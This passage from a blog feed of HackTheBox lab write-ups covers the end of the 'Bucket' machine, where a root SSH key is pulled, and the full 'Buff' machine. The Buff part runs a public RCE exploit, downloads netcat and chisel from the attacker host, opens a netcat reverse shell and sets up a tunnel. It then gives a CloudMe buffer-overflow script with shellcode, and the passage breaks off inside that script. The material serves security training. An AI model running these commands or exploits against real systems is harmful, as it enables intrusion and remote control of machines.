</span></span><span class="line"><span class="cl">* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
</span></span><span class="line"><span class="cl">&gt; POST / HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; Host: 127.0.0.1:8000
</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.66.0
</span></span><span class="line"><span class="cl">&gt; Accept: */*
</span></span><span class="line"><span class="cl">&gt; Content-Length: <span class="m">17</span>
</span></span><span class="line"><span class="cl">&gt; Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">&gt; 
</span></span><span class="line"><span class="cl">* upload completely sent off: <span class="m">17</span> out of <span class="m">17</span> bytes
</span></span><span class="line"><span class="cl">* Mark bundle as not supporting multiuse
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">&lt; Date: Thu, <span class="m">22</span> Apr <span class="m">2021</span> 20:04:14 GMT
</span></span><span class="line"><span class="cl">&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">&lt; 
</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
</span></span></code></pre></div><p>On <code>roy</code> shell, I can see it the SSH key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app/files$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sed -n <span class="s1">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>The full process as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210425032310617.png" alt="image-20210425032310617"  /></div>
</p>
<p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> root_rsa
</span></span></code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ ssh -i root_rsa 10.10.10.212
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-48-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> br-bee97070fb20: 172.18.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> ens160:          10.10.10.212
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> ens160:          dead:beef::250:56ff:feb9:df48
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">root@bucket:~# id<span class="p">;</span>hostname<span class="p">;</span>cut -c-15 root.txt 
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">bucket
</span></span><span class="line"><span class="cl">efc73dd09ceb705
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Buff</title>
      <link>https://fahmifj.github.io/hackthebox/buff/</link>
      <pubDate>Sat, 21 Nov 2020 16:09:25 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/buff/</guid>
      <description>Tunneling with Chisel to deliver a buffer overflow exploit</description>
      <content:encoded><![CDATA[<p>Buff is a Windows machine with easy difficulty  from HackTheBox that features an open source web application called &ldquo;Gym Management System&rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Gym Management System 1.0 Exploitation</li>
<li>Tunneling</li>
<li>CloudMe 1.12 Exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>searchsploit/Exploit-DB - Preinstalled in Kali Linux</li>
<li><a href="https://github.com/jpillora/chisel/releases">chisel</a></li>
<li>msfvenom - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> only discovers one port open on 8080 running an Apache web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache httpd 2.4.43 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: mrb3n’s Bro Hut
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>Visiting port 8080 displays a website for a Gym, on the title it is called &ldquo;mrb3n&rsquo;s Bro Hut&rdquo;.</p>
<img src="imgs/image-20210502140814680.png" alt="image-20210502140814680" style="zoom: 67%;" />
<p>Clicking on the contact page discovers the name of the software behind this web application.</p>
<img src="imgs/image-20210502140846741.png" alt="image-20210502140846741" style="zoom:67%;" />
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the software name to <code>searchsploit</code>. It pops several exploits, and one that stands out is a remote code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «machines» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ searchsploit Gym Management System 1.0
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                                 <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">Gym Management System 1.0 - <span class="s1">&#39;id&#39;</span> SQL Injection                                 <span class="p">|</span> php/webapps/48936.txt
</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Authentication Bypass                              <span class="p">|</span> php/webapps/48940.txt
</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Stored Cross Site Scripting                        <span class="p">|</span> php/webapps/48941.txt
</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Unauthenticated Remote Code Execution              <span class="p">|</span> php/webapps/48506.py
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shaun">Shell as shaun</h3>
<p>I will grab the unauth RCE with <code>searchsploit -m</code>, it allows me to mirror/make a copy of the &ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution&rdquo; exploit to the current working directory</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ searchsploit -m <span class="m">48506</span>
</span></span><span class="line"><span class="cl">  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/48506
</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
</span></span><span class="line"><span class="cl">File Type: Python script, ASCII text executable, with CRLF line terminators
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copied to: /root/htb/machines/buff/exploit/48506.py
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">5164</span> May  <span class="m">2</span> 04:29 48506.py
</span></span></code></pre></div><p>I will rename <code>48506.py</code> to <code>exploit.py</code>, and run it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ python exploit.py http://10.10.10.198:8080/
</span></span></code></pre></div><img src="imgs/image-20210502153153898.png" alt="image-20210502153153898" style="zoom:67%;" />
<p>With current webshell, I can&rsquo;t change my directory but I can still grab the user flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\s</span>haun<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
</span></span></code></pre></div><h4 id="upgrade-to-interactive-shell">Upgrade to Interactive Shell</h4>
<p>To make the shell a bit more comfy, I uploaded a <code>netcat</code> using <code>powershell</code> to Buff, and then I will create another reverse shell session.</p>
<p>First, I will host a 64 bit netcat, <code>nc64.exe</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ python -m http.server <span class="m">80</span>
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">10.10.10.198 - - <span class="o">[</span>14/Aug/2020 10:11:02<span class="o">]</span> <span class="s2">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span class="m">200</span>
</span></span></code></pre></div><p>On Buff, I will grab the hosted <code>nc64.exe</code> using PowerShell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe&#34;</span>
</span></span></code></pre></div><p>While having my netcat listening, I will send a reverse shell from Buff by leveraging the uploaded netcat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;.<span class="se">\n</span>c.exe -e cmd.exe 10.10.14.18 <span class="m">9001</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.18<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.198<span class="o">]</span> <span class="m">64518</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17134.1550<span class="o">]</span>  
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>After enumerating the Users folder, I noticed a slightly different output when typing the <code>dir</code> command in <code>shaun</code> home directory.</p>
<p><div class="img-container"><img src="imgs/image-20210502155544622.png" alt="image-20210502155544622"  /></div>
</p>
<p>In the Download folder, there is an executable file called <code>CloudMe_1112.exe</code>, where 1112 is likely a version number.</p>
<p>Checking on currently running services with <code>netstat</code> discovers an unknown service bound on localhost port 8888.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; netstat -aonp tcp
</span></span><span class="line"><span class="cl">Active Connections
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Proto  Local Address          Foreign Address        State           PID
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:8888            0.0.0.0:0              LISTENING       <span class="m">7352</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...  
</span></span></code></pre></div><p>I can search the program name using the <code>tasklist</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; tasklist /FI <span class="s2">&#34;PID eq 7352&#34;</span> /v /FO list
</span></span></code></pre></div><img src="imgs/image-20210502160832477.png" alt="image-20210502160832477" style="zoom:67%;" />
<p>So PID 7352 on port 8888 is running <code>CloudMe.exe</code>, and because the user name field is showing as <strong>N/A</strong>, one possible thing is that I don’t have enough privilege to dig for more information about that process (it might be running with a higher privilege, either administrator or a local system).</p>
<h4 id="searchsploit-1">Searchsploit</h4>
<p>A quick search about &ldquo;CloudMe&rdquo; on <code>searchsploit</code> pops some buffer overflow exploits. Four of them are exact match. I will grab the PoC version.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ searchsploit CloudMe
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                                 <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>PoC<span class="o">)</span>                                         <span class="p">|</span> windows/remote/48389.py
</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>SEH_DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48499.txt
</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow ROP <span class="o">(</span>DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48840.py
</span></span><span class="line"><span class="cl">Cloudme 1.9 - Buffer Overflow <span class="o">(</span>DEP<span class="o">)</span> <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> windows_x86-64/remote/45197.rb
</span></span><span class="line"><span class="cl">CloudMe Sync 1.10.9 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)(</span>DEP Bypass<span class="o">)</span>                        <span class="p">|</span> windows_x86-64/local/45159.py
</span></span><span class="line"><span class="cl">CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow <span class="o">(</span>Metasploit<span class="o">)</span>                 <span class="p">|</span> windows/remote/44175.rb
</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.0 - Local Buffer Overflow                                    <span class="p">|</span> windows/local/44470.py
</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                <span class="p">|</span> windows/remote/46218.py
</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span class="o">(</span>DEP Bypass<span class="o">)</span>                       <span class="p">|</span> windows_x86-64/remote/46250.py
</span></span><span class="line"><span class="cl">CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                        <span class="p">|</span> windows/remote/44027.py
</span></span><span class="line"><span class="cl">CloudMe Sync &lt; 1.11.0 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)</span> <span class="o">(</span>DEP Bypass<span class="o">)</span>                     <span class="p">|</span> windows_x86-64/remote/44784.py
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><h4 id="tunneling">Tunneling</h4>
<p>The CloudMe program is currently listening on localhost (bound), so to interact with it, I&rsquo;ll have to setup a tunnel/port forwarding. For this, I&rsquo;ll use <code>chisel</code> (<a href="https://github.com/jpillora/chisel/releases)">https://github.com/jpillora/chisel/releases)</a>.</p>
<blockquote>
<p>Example usage of chisel is explained better in this blog :</p>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel</a></li>
</ul>
</blockquote>
<p>First, I&rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; powershell.exe <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe&#34;</span>
</span></span></code></pre></div><p>Second, I&rsquo;ll setup a chisel server on my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ chisel server -p <span class="m">9002</span>
</span></span><span class="line"><span class="cl">2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2
</span></span><span class="line"><span class="cl">2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002...
</span></span></code></pre></div><p>On Buff, I&rsquo;ll connect as client to my chisel server on Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; .<span class="se">\c</span>s.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888
</span></span></code></pre></div><img src="imgs/image-20210502162654346.png" alt="image-20210502162654346" style="zoom:67%;" />
<p>This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff&rsquo;s localhost on port 8888.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Kali localhost:8888 &lt;-&gt; (Kali 10.10.14.18:9002 &lt;-&gt; Buff:10.10.10.198:XXX) &lt;-&gt; Buff localhost:8888
</span></span></code></pre></div><h4 id="exploitation-cloudme-1112">Exploitation CloudMe 1.11.2</h4>
<p>I&rsquo;ll use this exploit PoC (I&rsquo;ve renamed it to <code>bofexploit.py</code>) but I&rsquo;ll have to modify the payload with my own.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Date: 2020-04-27</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: Andy Bowden</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: https://www.cloudme.com/en</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Version: CloudMe 1.11.2</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: Windows 10 x86</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Instructions:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Start the CloudMe service and run the script.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">padding1</span>   <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
</span></span><span class="line"><span class="cl"><span class="n">EIP</span>        <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
</span></span><span class="line"><span class="cl"><span class="n">NOPS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">overrun</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
